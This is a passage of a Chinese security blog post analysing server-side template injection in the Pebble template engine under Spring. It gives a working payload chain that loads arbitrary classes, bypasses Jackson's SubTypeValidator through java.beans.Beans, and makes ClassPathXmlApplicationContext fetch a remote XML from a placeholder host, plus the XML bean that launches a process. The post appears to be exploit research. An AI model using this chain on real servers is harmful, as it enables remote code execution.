class="line">spring.servlet.multipart-org.springframework.boot.autoconfigure.web.servlet.MultipartProperties</span><br><span class="line">org.springframework.aop.config.internalAutoProxyCreator</span><br></pre></td></tr></table></figure>
+
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220808085343549.png" alt="image-20220808085343549"></p>
+<p>因此这样既可加载任意类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set class1= beans.get(&quot;org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory&quot;).resourceLoader.classLoader.loadClass(&quot;xxxx&quot;) %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过jackson获取类实例（将json转化为实体类）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set classInstance =  beans.get(&quot;jacksonObjectMapper&quot;).readValue(&quot;&#123;&#125;&quot;, class1) %&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>环境是jdk18，发现engineManager.getEngineByName里面裤子都不剩了啥都没有，同时由于jackson实例化限制我们也不能直接实例化jshell</p>
+</blockquote>
+<p>还有两个类它们实例化加载配置文件可以造成rce</p>
+<ul>
+<li>org.springframework.context.support.ClassPathXmlApplicationContext</li>
+<li>org.springframework.context.support.FileSystemXmlApplicationContext</li>
+</ul>
+<p>但在<code>SubTypeValidator</code>中也做了限制</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220808090415363.png" alt="image-20220808090415363"></p>
+<p>最终通过<code>java.beans.Beans#instantiate</code>方法可以加载任意public修饰的构造方法对象（方法加载绕过）</p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220808091749276.png" alt="image-20220808091749276"></p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220808091815721.png" alt="image-20220808091815721"></p>
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220808091826133.png" alt="image-20220808091826133"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set y= beans.get(&quot;org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory&quot;).resourceLoader.classLoader.loadClass(&quot;java.beans.Beans&quot;) %&#125;</span><br><span class="line">&#123;% set yy =  beans.get(&quot;jacksonObjectMapper&quot;).readValue(&quot;&#123;&#125;&quot;, y) %&#125;</span><br><span class="line">&#123;% set yyy = yy.instantiate(null,&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;) %&#125;</span><br><span class="line">&#123;&#123; yyy.setConfigLocation(&quot;http://xxxx/eval.xml&quot;) &#125;&#125;</span><br><span class="line">&#123;&#123; yyy.refresh() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">constructor-arg</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/SSTI-Thymeleaf-Pebble.assets/image-20220808092829688.png" alt="image-20220808092829688"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1063.html">https://www.cnpanda.net/sec/1063.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1692/">https://tttang.com/archive/1692/</a></p>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+      <div class="card-cover" background-image-lazy data-img="/images/google.png"></div>
+    
+    <div class="card-text">
+      
+        <a href="/2022/07/31/GoogleCTF-log4j/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">GoogleCTF log4j</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
+    </div>
+  </article>
+</div>
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+      <div class="card-cover" background-image-lazy data-img="/images/mtws.jpg"></div>
+    
+    <div class="card-text">
+      
+        <a href="/2022/07/29/MemShell-TomcatWebSocket/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">MemShell-TomcatWebSocket</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="/images/touxiang.jpg" class="soft-size--round soft-style--box" alt="CyanM0un">
+    
+    
+      <h2>CyanM0un</h2>
+    
+    
+      <p>青山见我应如是</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>7</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        3
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        0
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+<section class="widget-toc widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-toc" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M134.50666666 767.46666668H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.23999999v50.13333333c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H134.50666666c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.13333333c0.10666668-27.73333333 22.50666668-50.24000001 50.24000001-50.24000001zM84.37333332 541.65333333h326.18666669c27.73333333 0 50.24000001 22.39999999 50.23999999 50.13333334v50.24000001c0 27.73333333-22.50666668 50.24000001-50.24000002 50.23999999H84.37333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.23999999v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333334zM134.50666666 315.83999999H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.24000001v50.24000001c0 27.73333333-22.50666668 50.13333334-50.24000001 50.13333333H134.50666666c-27.73333333 0-50.24000001-22.39999999-50.23999999-50.13333333v-50.24000001c0.10666668-27.84000001 22.50666668-50.24000001 50.24000001-50.23999999zM209.81333332 89.91999999h326.18666671c27.73333333 0 50.24000001 22.39999999 50.23999997 50.13333335v50.23999999c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H209.81333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333333zM692.05333333 623.36l274.66666669 176.00000002c23.36000001 14.93333333 30.08 45.97333334 15.14666666 69.33333332L954.77333334 910.93333333c-14.93333333 23.25333334-45.97333334 30.08-69.33333335 15.14666667l-274.66666666-176c-23.36000001-14.93333333-30.08-45.97333334-15.14666667-69.33333333l27.09333334-42.24000001c14.93333333-23.36000001 46.08000001-30.08 69.33333333-15.14666666z" fill="currentColor"></path>
+</svg>
+    <span>TOC</span>
+  </div>
+  <div class="widget-body">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Thymeleaf"><span class="toc-number">2.1.</span> <span class="toc-text">Thymeleaf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pebble"><span class="toc-number">2.2.</span> <span class="toc-text">Pebble</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+  </div>
+</section>
+
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>读书切戒在慌忙，涵泳工夫兴味长</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/">
+            复现学习 (7)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/%E5%86%85%E5%AD%98%E9%A9%AC/">
+            内存马 (2)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">
+            安全工具 (1)
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+          <a href="https://github.com/CyanM0un" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+    </div>
+     
+    <p>&copy; 2022 <a href="/" target="_blank">CyanM0un</a></p>
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
